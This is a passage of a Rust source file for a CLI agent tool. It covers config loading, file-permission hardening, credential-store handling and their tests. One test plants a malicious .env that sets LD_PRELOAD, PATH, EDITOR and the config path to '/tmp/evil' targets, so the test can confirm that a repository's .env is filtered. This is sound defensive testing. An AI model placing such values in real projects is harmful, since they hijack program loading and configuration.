        .collect::<Vec<_>>()
        .join(", ");
    tracing::warn!(
        "Ignoring {names} from {path}: these decide where configuration is read from or what \
         gets executed, so a repository may not set them. Export them yourself if you meant to."
    );
}

/// Check permissions on the config file and auto-fix if too permissive.
///
/// A no-op on non-Unix platforms - see [`leviath_sys::ensure_file_private`].
fn check_permissions() {
    check_permissions_at(&Config::config_path());
}

/// Core of [`check_permissions`], parameterized by path so it can be exercised
/// in tests against a tempfile instead of the real config path.
///
/// The permission mechanism (metadata probe + `chmod`) lives in `leviath_sys`;
/// this function owns only the policy of what to log for each outcome.
fn check_permissions_at(path: &std::path::Path) {
    check_permissions_at_with(path, leviath_sys::ensure_file_private);
}

/// Core of [`check_permissions_at`] with the permission-hardening operation
/// injected, so the "fix failed" arm can be covered deterministically on every
/// OS. On disk that `Err` only occurs when a file exists but `chmod` fails -
/// forcing that without root differs per platform (macOS `chflags uchg`, no
/// portable Linux equivalent), so a `fn` pointer is injected instead of relying
/// on an OS-specific trick. A `fn` pointer (not `impl Fn`) keeps this to a
/// single monomorphization.
fn check_permissions_at_with(
    path: &std::path::Path,
    ensure: fn(&std::path::Path) -> std::io::Result<Option<u32>>,
) {
    match ensure(path) {
        Ok(Some(old_mode)) => {
            let masked_mode = old_mode & 0o777;
            tracing::warn!(
                "Config file has overly permissive permissions ({:o}), fixing to 600",
                masked_mode
            );
        }
        Ok(None) => {}
        Err(e) => tracing::warn!("Failed to fix config file permissions: {}", e),
    }
}

/// Set restrictive permissions on the config directory.
fn set_dir_permissions(path: &std::path::Path) {
    set_dir_permissions_with(path, leviath_sys::secure_dir_perms);
}

/// Core of [`set_dir_permissions`] with the hardening operation injected; see
/// [`set_file_permissions_with`] for why.
fn set_dir_permissions_with(
    path: &std::path::Path,
    secure: fn(&std::path::Path) -> std::io::Result<()>,
) {
    if let Err(e) = secure(path) {
        tracing::warn!("Failed to set config directory permissions: {}", e);
    }
}

/// Serde default for a flag that ships on.
///
/// Shared by `[security]`, `[limits]` and `Config` itself, so it lives here
/// rather than in whichever section happened to need it first: serde resolves
/// a `default = "..."` path in the module the struct is defined in, so a helper
/// three sections use has to be reachable from all three.
pub(crate) fn default_true() -> bool {
    true
}

/// The provider a config that names none is assumed to mean.
///
/// Exists so `default_provider` can carry `#[serde(default)]`: without one,
/// every field on [`Config`] that lacked a default made a hand-written
/// `config.toml` a parse error. Writing three lines to point Leviath at
/// OpenRouter used to fail with `missing field `providers``, which names a
/// table the user has no reason to know about and says nothing about what to
/// add. Kept in sync with [`Config::default`] by
/// `an_empty_config_file_parses_to_the_defaults`.
pub(crate) fn default_provider_name() -> String {
    "anthropic".to_string()
}

/// Serializes any test, anywhere in the crate, that mutates the process's
/// current working directory (via `std::env::set_current_dir`) or whose
/// assertions implicitly depend on it. Declared here (not inside `mod tests`)
/// so it's reachable crate-wide: a per-file lock (as in
/// `commands/run/manifest.rs`'s CWD-dependent `find_manifest` tests) would not
/// serialize against a CWD-mutating test in a different file. (Env-var
/// isolation, by contrast, goes through the `temp-env` crate's own global
/// lock; `set_current_dir` is not an env var, so it keeps this dedicated lock.)
#[cfg(test)]
pub(crate) static CWD_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// RAII guard that releases [`CWD_LOCK`] and restores the process's
/// original working directory on drop.
///
/// Wraps the `MutexGuard` inside a private field specifically so it can be held
/// across an `.await` in an async test without tripping clippy's
/// `await_holding_lock` lint, which only looks for a directly-visible
/// `MutexGuard` local - not one hidden inside a wrapper struct's field.
/// That's not working around a real risk: each `#[tokio::test]` gets its
/// own private single-threaded runtime, so holding this across an await
/// can't starve another task in the *same* test: it only serializes
/// against other CWD-mutating tests, which is exactly the intended effect.
///
/// Was `#[cfg(unix)]` as well, because its only caller -
/// `commands/list.rs`'s `execute_falls_back_to_default_cwd_when_current_dir_is_gone` -
/// is Unix-only (the race it reproduces, deleting a directory that is the
/// process's live CWD, is a sharing violation on Windows rather than a
/// reproducible state), which made it dead code there under `-D warnings`.
/// `a_dot_env_in_the_working_directory_is_read` is a second caller that must run
/// on every platform, so the gate is gone and the dead-code concern with it.
#[cfg(test)]
pub(crate) struct CwdTestGuard {
    original_cwd: std::path::PathBuf,
    _lock: std::sync::MutexGuard<'static, ()>,
}

#[cfg(test)]
impl Drop for CwdTestGuard {
    fn drop(&mut self) {
        let _ = std::env::set_current_dir(&self.original_cwd);
    }
}

/// Acquire [`CWD_LOCK`] and snapshot the current working directory so it can
/// be restored automatically when the returned guard drops.
#[cfg(test)]
pub(crate) fn isolate_cwd_for_test() -> CwdTestGuard {
    let lock = CWD_LOCK
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner);
    let original_cwd = std::env::current_dir().expect("current dir must be readable at test start");
    CwdTestGuard {
        original_cwd,
        _lock: lock,
    }
}

/// Provider API key env vars that `Config::load()` (via `dotenvy::dotenv()`)
/// loads into the process env regardless of which config file path is used --
/// so redirecting the config path alone isn't enough; these must be cleared
/// too by [`config_isolation_vars`].
#[cfg(test)]
const PROVIDER_KEY_ENV_VARS: &[&str] = &[
    "ANTHROPIC_API_KEY",
    "OPENAI_API_KEY",
    "GOOGLE_API_KEY",
    "OPENROUTER_API_KEY",
];

/// Create a fresh, empty temp directory to stand in for the config directory.
#[cfg(test)]
fn make_fake_config_dir(unique: &str) -> std::path::PathBuf {
    let fake_dir = std::env::temp_dir().join(format!("lev-fake-config-{unique}"));
    let _ = std::fs::create_dir_all(&fake_dir);
    fake_dir
}

/// The env overrides that isolate `Config::load()` from the real environment:
/// point `LEVIATH_CONFIG_PATH` at a nonexistent file in `fake_dir`, set
/// `LEVIATH_SKIP_DOTENV`, and clear every provider API key (so no real, billed
/// inference call can be made). Consumed by [`with_isolated_config_path`] and
/// its async twin, which hand it to `temp_env` for scoped set-and-restore.
///
/// `pub(crate)` because `temp_env` serializes process-wide and holds its lock
/// across the closure, so a test needing *these* overrides plus others (the
/// `lev doctor` tests also redirect `LEVIATH_HOME` and `LEVIATH_RUNS_DIR`)
/// cannot nest a second `temp_env` call inside the wrapper - it has to build
/// one combined list from this one.
#[cfg(test)]
pub(crate) fn config_isolation_vars(
    fake_dir: &std::path::Path,
) -> Vec<(&'static str, Option<std::ffi::OsString>)> {
    let mut vars: Vec<(&'static str, Option<std::ffi::OsString>)> = vec![
        (
            "LEVIATH_CONFIG_PATH",
            Some(fake_dir.join("config.toml").into_os_string()),
        ),
        ("LEVIATH_SKIP_DOTENV", Some(std::ffi::OsString::from("1"))),
    ];
    for &key in PROVIDER_KEY_ENV_VARS {
        vars.push((key, None));
    }
    vars
}

/// Runs `f` with `Config::load()` isolated from the real environment (see
/// [`config_isolation_vars`]), passing it the fake config directory so tests
/// that need to plant a `config.toml` can. `temp_env::with_vars` sets the
/// overrides, runs the closure, and restores the prior values afterwards --
/// serialized process-wide against every other temp-env test, so no hand-rolled
/// lock is needed. The closure-scoped form (not an RAII guard) is required
/// because edition 2024 makes `set_var` `unsafe`, which the crate forbids.
#[cfg(test)]
pub(crate) fn with_isolated_config_path<R>(
    unique: &str,
    f: impl FnOnce(&std::path::Path) -> R,
) -> R {
    let fake_dir = make_fake_config_dir(unique);
    let result = temp_env::with_vars(config_isolation_vars(&fake_dir), || f(&fake_dir));
    let _ = std::fs::remove_dir_all(&fake_dir);
    result
}

/// Async counterpart of [`with_isolated_config_path`] for `#[tokio::test]`s.
/// The isolation env vars stay in place across every `.await` in `fut`.
#[cfg(test)]
pub(crate) async fn with_isolated_config_path_async<R, Fut>(
    unique: &str,
    f: impl FnOnce(std::path::PathBuf) -> Fut,
) -> R
where
    Fut: std::future::Future<Output = R>,
{
    let fake_dir = make_fake_config_dir(unique);
    let result =
        temp_env::async_with_vars(config_isolation_vars(&fake_dir), f(fake_dir.clone())).await;
    let _ = std::fs::remove_dir_all(&fake_dir);
    result
}

#[cfg(test)]
mod dotenv_tests {
    use super::*;

    /// `Config::load()` reads `./.env`, and every isolated test sets
    /// `LEVIATH_SKIP_DOTENV` - so that branch would otherwise never run.
    ///
    /// Leaving it to the tests that read the real environment would leave it to
    /// exactly the tests that race. Covered deliberately here
    /// instead: still inside `temp_env` (so it holds the same process-wide lock
    /// as everything else) and still pointed at a scratch config, but with the
    /// skip flag cleared so the `.env` read actually happens. The probe
    /// variable is listed in the same call so `temp_env` removes it afterwards
    /// rather than leaking it into the rest of the run.
    #[test]
    fn a_dot_env_in_the_working_directory_is_read() {
        let dir = make_fake_config_dir("dotenv-read");
        std::fs::write(dir.join(".env"), "LEV_DOTENV_PROBE=seen\n").unwrap();

        // Scoped so the CWD guard drops - restoring the working directory -
        // before the cleanup below. Windows refuses to remove a directory that
        // is some process's live CWD.
        {
            let _cwd = isolate_cwd_for_test();
            std::env::set_current_dir(&dir).unwrap();

            temp_env::with_vars(
                [
                    (
                        "LEVIATH_CONFIG_PATH",
                        Some(dir.join("config.toml").into_os_string()),
                    ),
                    ("LEVIATH_SKIP_DOTENV", None),
                    ("LEV_DOTENV_PROBE", None),
                ],
                || {
                    let loaded = Config::load();
                    assert!(loaded.is_ok(), "a missing config file is not an error");
                    assert_eq!(
                        std::env::var("LEV_DOTENV_PROBE").ok().as_deref(),
                        Some("seen"),
                        "the .env beside the working directory was read"
                    );
                },
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The escalation this filter exists for. A cloned repository is the
    /// working directory, so its `.env` is attacker-authored content - and one
    /// line of `LEVIATH_CONFIG_PATH` would have pointed the very next statement
    /// in `Config::load` at a config file of the repository's choosing,
    /// carrying its own `[mcp_servers]` commands and `[tool_permissions]`.
    #[test]
    fn a_dot_env_cannot_steer_where_config_comes_from() {
        let dir = make_fake_config_dir("dotenv-steer");
        std::fs::write(
            dir.join(".env"),
            "LEVIATH_CONFIG_PATH=/tmp/evil.toml\n\
             LEVIATH_API_TOKEN=known\n\
             EDITOR=/tmp/evil\n\
             PATH=/tmp/evil\n\
             LD_PRELOAD=/tmp/evil.so\n\
             LEV_DOTENV_KEEPS=kept\n",
        )
        .unwrap();

        {
            let _cwd = isolate_cwd_for_test();
            std::env::set_current_dir(&dir).unwrap();

            temp_env::with_vars(
                [
                    (
                        "LEVIATH_CONFIG_PATH",
                        Some(dir.join("config.toml").into_os_string()),
                    ),
                    ("LEVIATH_SKIP_DOTENV", None),
                    ("LEVIATH_API_TOKEN", None),
                    ("EDITOR", None),
                    ("LD_PRELOAD", None),
                    ("LEV_DOTENV_KEEPS", None),
                ],
                || {
                    Config::load().expect("a missing config file is not an error");
                    for steering in ["LEVIATH_API_TOKEN", "EDITOR", "LD_PRELOAD"] {
                        assert!(
                            std::env::var(steering).is_err(),
                            "{steering} must not be settable from a repository's .env"
                        );
                    }
                    // The one already set by the harness keeps the harness's
                    // value rather than the file's, which is dotenvy's own
                    // precedence and the reason this is not a regression.
                    assert_ne!(
                        std::env::var("LEVIATH_CONFIG_PATH").ok(),
                        Some("/tmp/evil.toml".to_string())
                    );
                    // And an ordinary variable still loads: the point is to
                    // filter what steers the process, not to stop reading
                    // `.env` files.
                    assert_eq!(
                        std::env::var("LEV_DOTENV_KEEPS").ok().as_deref(),
                        Some("kept")
                    );
                },
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Most working directories have no `.env`, so that is the ordinary case
    /// rather than a failure. Driven directly with an absolute path, since the
    /// point is the file's absence and not the working directory.
    #[test]
    fn a_missing_dot_env_is_not_an_error() {
        let dir = make_fake_config_dir("dotenv-missing");
        load_dotenv_filtered(&dir.join("absent.env").to_string_lossy());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A `.env` that sets nothing sensitive is the ordinary case, and it used
    /// to warn anyway: the message named the skipped variables, so with none
    /// skipped users read "Ignoring  from .env" with a hole where a name
    /// belonged. Under `-v` that landed in the middle of the setup wizard.
    #[test]
    fn an_ordinary_dot_env_warns_about_nothing() {
        let dir = make_fake_config_dir("dotenv-nothing-skipped");
        std::fs::write(dir.join(".env"), "LEV_DOTENV_ORDINARY=fine\n").unwrap();

        {
            let _cwd = isolate_cwd_for_test();
            std::env::set_current_dir(&dir).unwrap();
            temp_env::with_vars(
                [
                    (
                        "LEVIATH_CONFIG_PATH",
                        Some(dir.join("config.toml").into_os_string()),
                    ),
                    ("LEVIATH_SKIP_DOTENV", None),
                    ("LEV_DOTENV_ORDINARY", None),
                ],
                || {
                    Config::load().expect("a missing config file is not an error");
                    // The allowed variable still lands, so the early return
                    // skips the warning and nothing else.
                    assert_eq!(
                        std::env::var("LEV_DOTENV_ORDINARY").ok().as_deref(),
                        Some("fine")
                    );
                },
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The escape set has to match dotenvy's double-quoted parser exactly, so
    /// each arm is checked here rather than only through a whole-file load.
    #[test]
    fn requote_escapes_what_both_dotenvy_layers_read() {
        assert_eq!(requote("plain"), r#""plain""#);
        assert_eq!(requote(r"C:\tools\"), r#""C:\\tools\\""#);
        assert_eq!(requote(r#"say "hi""#), r#""say \"hi\"""#);
        // `$` escaped so the value is not substituted a second time - it was
        // already expanded by the parse that produced it.
        assert_eq!(requote("cost $5 $HOME"), r#""cost \$5 \$HOME""#);
        assert_eq!(requote("one\ntwo"), r#""one\ntwo""#);
    }

    /// A backslash is where the re-serialization nearly went wrong: dotenvy's
    /// *value* parser treats single quotes as fully literal, but its *line*
    /// reader honours `\` escapes inside them, so a value ending in a
    /// backslash could eat the closing quote, swallow the following line, and
    /// fail the whole document - silently, since the load result is discarded.
    /// Every variable after it would vanish with no warning.
    #[test]
    fn filtering_survives_a_value_ending_in_a_backslash() {
        let dir = make_fake_config_dir("dotenv-backslash");
        // Double-quoted at source, because that is the only spelling in which a
        // dotenv value can *end* in a backslash - which is exactly the value
        // that broke the single-quoted re-serialization.
        std::fs::write(
            dir.join(".env"),
            "PATH=/tmp/anything\n\
             LEV_DOTENV_BACKSLASH=\"C:\\\\tools\\\\\"\n\
             LEV_DOTENV_AFTER=survived\n",
        )
        .unwrap();

        {
            let _cwd = isolate_cwd_for_test();
            std::env::set_current_dir(&dir).unwrap();

            temp_env::with_vars(
                [
                    (
                        "LEVIATH_CONFIG_PATH",
                        Some(dir.join("config.toml").into_os_string()),
                    ),
                    ("LEVIATH_SKIP_DOTENV", None),
                    ("LEV_DOTENV_BACKSLASH", None),
                    ("LEV_DOTENV_AFTER", None),
                ],
                || {
                    Config::load().expect("a missing config file is not an error");
                    assert_eq!(
                        std::env::var("LEV_DOTENV_BACKSLASH").ok().as_deref(),
                        Some("C:\\tools\\")
                    );
                    assert_eq!(
                        std::env::var("LEV_DOTENV_AFTER").ok().as_deref(),
                        Some("survived"),
                        "a later variable must not be swallowed by an unbalanced quote"
                    );
                },
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The filtered path re-serializes the survivors, so it has to hand back
    /// exactly what the parser read - quotes, spaces and `#` included.
    #[test]
    fn filtering_preserves_an_awkward_value_verbatim() {
        let dir = make_fake_config_dir("dotenv-quoting");
        std::fs::write(
            dir.join(".env"),
            "PATH=/tmp/evil\n\
             LEV_DOTENV_AWKWARD=\"it's a #value with 'quotes' and spaces\"\n",
        )
        .unwrap();

        {
            let _cwd = isolate_cwd_for_test();
            std::env::set_current_dir(&dir).unwrap();

            temp_env::with_vars(
                [
                    (
                        "LEVIATH_CONFIG_PATH",
                        Some(dir.join("config.toml").into_os_string()),
                    ),
                    ("LEVIATH_SKIP_DOTENV", None),
                    ("LEV_DOTENV_AWKWARD", None),
                ],
                || {
                    Config::load().expect("a missing config file is not an error");
                    assert_eq!(
                        std::env::var("LEV_DOTENV_AWKWARD").ok().as_deref(),
                        Some("it's a #value with 'quotes' and spaces")
                    );
                },
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod tests {
    /// The published JSON Schema for `config.toml`, and a config exercising
    /// every section of it. Compiled in so neither can drift from what ships.
    const CONFIG_SCHEMA: &str = include_str!("../../../../docs/schema/config.schema.json");
    const CONFIG_EXAMPLE: &str = include_str!("../../../../docs/schema/config.example.toml");

    /// Every way `value` fails `validator`. See the twin in `bundled.rs`.
    fn schema_problems(
        validator: &jsonschema::Validator,
        value: &serde_json::Value,
    ) -> Vec<String> {
        validator
            .iter_errors(value)
            .map(|e| format!("{}: {e}", e.instance_path()))
            .collect()
    }

    /// An unknown key is reported wherever it sits, not only at the top level.
    ///
    /// The reported case (#365) was `[limits] max_concurrent_tool`, a
    /// misspelling one level down, which the first version of this check could
    /// not see: it compared top-level keys only, so a whole bogus table was
    /// named and a bogus key inside a real table was not.
    #[test]
    fn an_unknown_key_is_reported_at_any_depth() {
        let content = "\
default_provider = \"anthropic\"

[cache]
ttl = \"banana\"

[limits]
max_concurrent_tool = 3

[providers]
anthropic_api_key = \"x\"
anthropic_cach_ttl = \"1h\"
";
        let unknown = Config::unknown_config_keys(content);
        assert!(unknown.contains(&"cache".to_string()), "{unknown:?}");
        assert!(
            unknown.contains(&"limits.max_concurrent_tool".to_string()),
            "a key one level down is named by its path: {unknown:?}"
        );
        assert!(
            unknown.contains(&"providers.anthropic_cach_ttl".to_string()),
            "{unknown:?}"
        );
        // And the real keys beside them are not reported.
        assert!(
            !unknown.iter().any(|k| k == "default_provider"),
            "{unknown:?}"
        );
        assert!(
            !unknown.iter().any(|k| k == "providers.anthropic_api_key"),
            "{unknown:?}"
        );
    }

    /// A file that is TOML but not a config reports no unknown keys: it has a
    /// type error, and saying "every key here is unread" on top of that would
    /// bury the message that actually explains it.
    #[test]
    fn a_file_that_is_not_a_config_reports_no_unknown_keys() {
        // Parses as a table, fails as a `Config`: the provider is a number.
        assert!(Config::unknown_config_keys("default_provider = 42").is_empty());
    }

    /// `unread_keys_at` answers for a path, and a path that is not there is a
    /// question about a file rather than about its keys.
    #[test]
    fn unread_keys_of_a_missing_file_is_empty() {
        let dir = tempfile::tempdir().unwrap();
        assert!(Config::unread_keys_at(&dir.path().join("nope.toml")).is_empty());
    }

    #[test]
    fn unread_keys_at_reads_the_file_it_is_given() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "[cache]\nttl = \"banana\"\n").unwrap();
        assert_eq!(Config::unread_keys_at(&path), vec!["cache".to_string()]);
    }

    /// `[model_providers.<name>]` forwards whatever it does not recognise to a
    /// Rhai script through `#[serde(flatten)]`, so those keys *are* read and
    /// must stay quiet. This is the case a hand-maintained key list gets wrong.
    #[test]
    fn keys_a_flatten_field_absorbs_are_not_reported() {
        let content = "\
[model_providers.groq]
script = \"groq.rhai\"
some_custom_thing = \"forwarded to the script\"
";
        assert!(
            Config::unknown_config_keys(content).is_empty(),
            "a key serde keeps is a key nothing should complain about"
        );
    }

    /// The reported case: a table nothing reads, in a file that also sets a
    /// real key. Both halves matter - the unknown one is named, the real one
    /// is not, and the config still loads because every command reads it.
    #[test]
    fn an_unknown_config_key_is_reported_and_the_config_still_loads() {
        const CONTENT: &str = "default_provider = \"anthropic\"\n\n[cache]\nttl = \"banana\"\n";
        assert_eq!(
            Config::unknown_config_keys(CONTENT),
            vec!["cache".to_string()],
            "the unknown table is named and the real key is not"
        );

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, CONTENT).unwrap();
        // A subscriber has to be interested at this callsite or the `warn!`
        // body never runs. `tracing_guard` sets a thread-local default, which
        // holds whatever another test in this binary did to the global one.
        let _guard = leviath_testkit::tracing_guard();
        let config = Config::load_from_path(&path).expect("an unknown key does not stop the load");
        assert_eq!(config.default_provider, "anthropic");
    }

    /// A config using only real keys reports nothing. Without this the test
    /// above passes against a function that calls everything unknown.
    #[test]
    fn a_config_of_known_keys_reports_nothing() {
        assert!(
            Config::unknown_config_keys(CONFIG_EXAMPLE).is_empty(),
            "the shipped example must be clean"
        );
    }

    /// Content that is not TOML reports nothing rather than guessing. The
    /// caller has already failed to deserialize it and said so; a second,
    /// vaguer complaint about every line would only bury the first.
    #[test]
    fn unparseable_content_reports_no_unknown_keys() {
        assert!(Config::unknown_config_keys("this is not [[[ toml").is_empty());
    }

    #[test]
    fn the_example_config_satisfies_the_published_schema_and_deserializes() {
        // Both halves matter. The schema alone could describe a shape `Config`
        // rejects; `Config` alone could accept a shape the schema forbids.
        // Holding one fixture to both is what keeps them describing the same
        // format, since the schema is hand-written and nothing generates it.
        let example: toml::Value = toml::from_str(CONFIG_EXAMPLE).expect("the example is TOML");
        let schema: serde_json::Value =
            serde_json::from_str(CONFIG_SCHEMA).expect("the schema is JSON");
        let validator = jsonschema::validator_for(&schema).expect("the schema compiles");

        let json = serde_json::to_value(&example).expect("TOML converts to JSON");
        assert_eq!(
            schema_problems(&validator, &json),
            Vec::<String>::new(),
            "config.example.toml does not match config.schema.json"
        );

        let parsed: Config = toml::from_str(CONFIG_EXAMPLE).expect("the example deserializes");
        // A couple of spot checks that the values landed where the schema says,
        // rather than being silently dropped into nothing.
        assert_eq!(parsed.default_provider, "anthropic");
        assert_eq!(parsed.limits.interaction_timeout_secs, 3600);
        assert_eq!(parsed.mcp_servers.len(), 2);
    }

    #[test]
    fn the_config_schema_rejects_a_key_that_is_not_a_setting() {
        // Without `additionalProperties: false` the schema would accept any
        // typo, which is most of what an author wants it to catch.
        let schema: serde_json::Value =
            serde_json::from_str(CONFIG_SCHEMA).expect("the schema is JSON");
        let validator = jsonschema::validator_for(&schema).expect("the schema compiles");
        // Through `schema_problems` rather than `is_valid`, so the formatting
        // path the positive test relies on runs against real errors.
        let rejects = |toml_text: &str| {
            let value: toml::Value = toml::from_str(toml_text).expect("valid TOML");
            let json = serde_json::to_value(&value).expect("converts");
            !schema_problems(&validator, &json).is_empty()
        };

        assert!(
            rejects("default_provdier = \"anthropic\"\n"),
            "a typo'd key"
        );
        assert!(
            rejects("[limits]\ninteraction_timeout_secs = \"an hour\"\n"),
            "a string where a number belongs"
        );
        assert!(
            rejects("[security]\ncredential_store = \"vault\"\n"),
            "an unsupported credential store"
        );
        assert!(
            !rejects("default_provider = \"openrouter\"\n"),
            "a real key"
        );
    }

    /// Saving with a keychain that cannot be reached must fail rather than
    /// quietly writing the keys into the file. A user who asked for the keychain
    /// would otherwise end up with plaintext keys on disk and no sign of it.
    #[test]
    fn saving_with_an_unreachable_keychain_writes_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let mut config = Config::default();
        config.security.credential_store = leviath_core::CredentialStoreKind::Keychain;
        config.providers.anthropic_api_key = Some("sk-ant".to_string());

        assert!(
            config
                .write_to(&path, Err("no keychain".to_string()))
                .is_err()
        );
        assert!(!path.exists(), "no file may be written at all");
    }

    /// The same for a store that is reachable but refuses the write.
    #[test]
    fn saving_to_a_store_that_refuses_the_write_writes_nothing() {
        use leviath_core::CredentialStore as _;

        struct Refuses;
        impl leviath_core::CredentialStore for Refuses {
            fn get(&self, _: &str) -> Result<Option<String>, String> {
                Ok(None)
            }
            fn set(&self, _: &str, _: &str) -> Result<(), String> {
                Err("read-only keychain".to_string())
            }
            fn delete(&self, _: &str) -> Result<bool, String> {
                Err("read-only keychain".to_string())
            }
        }

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let mut config = Config::default();
        config.security.credential_store = leviath_core::CredentialStoreKind::Keychain;
        config.providers.anthropic_api_key = Some("sk-ant".to_string());

        // The other two answers are part of the contract even though `write_to`
        // only needs `set`; a store impl has to answer all three.
        assert_eq!(Refuses.get("provider/anthropic").unwrap(), None);
        assert!(Refuses.delete("provider/anthropic").is_err());

        let err = config
            .write_to(&path, Ok(Some(Box::new(Refuses))))
            .expect_err("a refused write is not a save");
        assert!(err.to_string().contains("failed to store"), "{err}");
        assert!(!path.exists(), "no file may be written at all");
    }

    /// And the successful keychain path: the secrets go to the store and the
    /// file keeps only the settings.
    #[test]
    fn saving_in_keychain_mode_puts_the_secrets_in_the_store_not_the_file() {
        use leviath_core::CredentialStore;

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let mut config = Config::default();
        config.security.credential_store = leviath_core::CredentialStoreKind::Keychain;
        config.providers.anthropic_api_key = Some("sk-ant-secret".to_string());
        config.default_model = Some("some-model".to_string());

        let store = std::sync::Arc::new(leviath_core::MemoryStore::new());
        struct Shared(std::sync::Arc<leviath_core::MemoryStore>);
        impl CredentialStore for Shared {
            fn get(&self, a: &str) -> Result<Option<String>, String> {
                self.0.get(a)
            }
            fn set(&self, a: &str, s: &str) -> Result<(), String> {
                self.0.set(a, s)
            }
            fn delete(&self, a: &str) -> Result<bool, String> {
                self.0.delete(a)
            }
        }

        config
            .write_to(&path, Ok(Some(Box::new(Shared(store.clone())))))
            .unwrap();

        // `delete` completes the trait; `write_to` itself never needs it.
        assert!(
            Shared(store.clone())
                .delete(&leviath_core::provider_account("anthropic"))
                .unwrap()
        );
        store
            .set(
                &leviath_core::provider_account("anthropic"),
                "sk-ant-secret",
            )
            .unwrap();

        let written = std::fs::read_to_string(&path).unwrap();
        assert!(!written.contains("sk-ant-secret"), "{written}");
        assert!(
            written.contains("some-model"),
            "settings survive: {written}"
        );
        // Read back through the same wrapper `write_to` was handed, so all
        // three of its methods are exercised.
        assert_eq!(
            Shared(store.clone())
                .get(&leviath_core::provider_account("anthropic"))
                .unwrap()
                .as_deref(),
            Some("sk-ant-secret")
        );
    }

    /// The keychain fills only what the file and the environment left unset --
    /// what the user can see wins over what they cannot.
    #[test]
    fn the_credential_store_fills_only_the_keys_that_are_unset() {
        use leviath_core::{CredentialStore, MemoryStore};

        let store = MemoryStore::new();
        store
            .set(
                &leviath_core::provider_account("anthropic"),
                "from-keychain",
            )
            .unwrap();
        store
            .set(&leviath_core::provider_account("openai"), "openai-keychain")
            .unwrap();
        store
            .set(&leviath_core::provider_account("google"), "google-keychain")
            .unwrap();
        store
            .set(&leviath_core::provider_account("openrouter"), "or-keychain")
            .unwrap();

        let mut config = Config::default();
        // Already set from the file: the keychain must not overwrite it.
        config.providers.anthropic_api_key = Some("from-file".to_string());
        config.apply_credential_store(&store);

        assert_eq!(
            config.providers.anthropic_api_key.as_deref(),
            Some("from-file"),
            "an existing key wins over the keychain"
        );
        assert_eq!(
            config.providers.openai_api_key.as_deref(),
            Some("openai-keychain")
        );
        assert_eq!(
            config.providers.google_api_key.as_deref(),
            Some("google-keychain")
        );
        assert_eq!(config.openrouter_api_key.as_deref(), Some("or-keychain"));
    }

    /// An empty store leaves everything alone rather than blanking keys.
    #[test]
    fn an_empty_credential_store_changes_nothing() {
        let mut config = Config::default();
        config.providers.openai_api_key = Some("keep-me".to_string());
        config.apply_credential_store(&leviath_core::MemoryStore::new());
        assert_eq!(config.providers.openai_api_key.as_deref(), Some("keep-me"));
        assert!(config.providers.anthropic_api_key.is_none());
    }

    /// The three resolutions the loader can get back. A keychain that was asked
    /// for but is unreachable must warn and carry on - refusing to load the
    /// config would take down `lev auth status`, the one command that can
    /// explain the problem.
    #[test]
    fn an_unreachable_credential_store_does_not_stop_the_config_loading() {
        use leviath_core::{CredentialStore, MemoryStore};

        let mut config = Config::default();
        config.fill_from_credential_store_with(Err("no keychain here".to_string()));
        assert!(config.providers.anthropic_api_key.is_none());

        // The file backend: nothing to overlay.
        let mut config = Config::default();
        config.providers.openai_api_key = Some("k".to_string());
        config.fill_from_credential_store_with(Ok(None));
        assert_eq!(config.providers.openai_api_key.as_deref(), Some("k"));

        // A working store fills the gap.
        let store = MemoryStore::new();
        store
            .set(&leviath_core::provider_account("anthropic"), "filled")
            .unwrap();
        let mut config = Config::default();
        config.fill_from_credential_store_with(Ok(Some(Box::new(store))));
        assert_eq!(
            config.providers.anthropic_api_key.as_deref(),
            Some("filled")
        );
    }

    #[test]
    fn provider_secrets_lists_every_set_key_and_nothing_else() {
        let mut config = Config::default();
        assert!(config.provider_secrets().is_empty());

        config.providers.anthropic_api_key = Some("a".to_string());
        config.openrouter_api_key = Some("o".to_string());
        let secrets = config.provider_secrets();
        assert_eq!(secrets.len(), 2);
        assert!(secrets.contains(&("provider/anthropic".to_string(), "a".to_string())));
        assert!(secrets.contains(&("provider/openrouter".to_string(), "o".to_string())));
    }

    /// `without_secrets` must return a *copy*: the caller is usually saving a
    /// config it is still going to run with, and blanking its keys in place
    /// would break that run.
    #[test]
    fn without_secrets_strips_a_copy_and_leaves_the_original_usable() {
        let mut config = Config::default();
        config.providers.anthropic_api_key = Some("a".to_string());
        config.providers.openai_api_key = Some("b".to_string());
        config.providers.google_api_key = Some("c".to_string());
        config.openrouter_api_key = Some("d".to_string());
        config.default_model = Some("m".to_string());

        let stripped = config.without_secrets();
        assert!(stripped.provider_secrets().is_empty(), "no keys survive");
        assert_eq!(stripped.default_model.as_deref(), Some("m"), "settings do");
        assert_eq!(
            config.providers.anthropic_api_key.as_deref(),
            Some("a"),
            "the original is untouched"
        );
    }

    use super::*;
    use crate::test_support::with_tracing;

    // ─── leviath_home_dir ────────────────────────────────────────────────────

    #[test]
    fn leviath_home_dir_uses_override_when_set() {
        temp_env::with_var(
            "LEVIATH_HOME",
            Some("/tmp/leviath-home-override-test"),
            || {
                assert_eq!(
                    leviath_home_dir(),
                    Some(std::path::PathBuf::from("/tmp/leviath-home-override-test"))
                );
            },
        );
    }

    #[test]
    fn leviath_home_dir_falls_back_to_dirs_home_dir_when_unset() {
        temp_env::with_var_unset("LEVIATH_HOME", || {
            assert_eq!(leviath_home_dir(), dirs::home_dir());
        });
    }

    // ─── load_from_path / save_to_path (path-parameterized for testability) ─

    #[test]
    fn load_from_path_missing_file_returns_defaults() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        let config = with_tracing(|| Config::load_from_path(&path)).unwrap();
        assert_eq!(config.default_provider, "anthropic");
    }

    #[test]
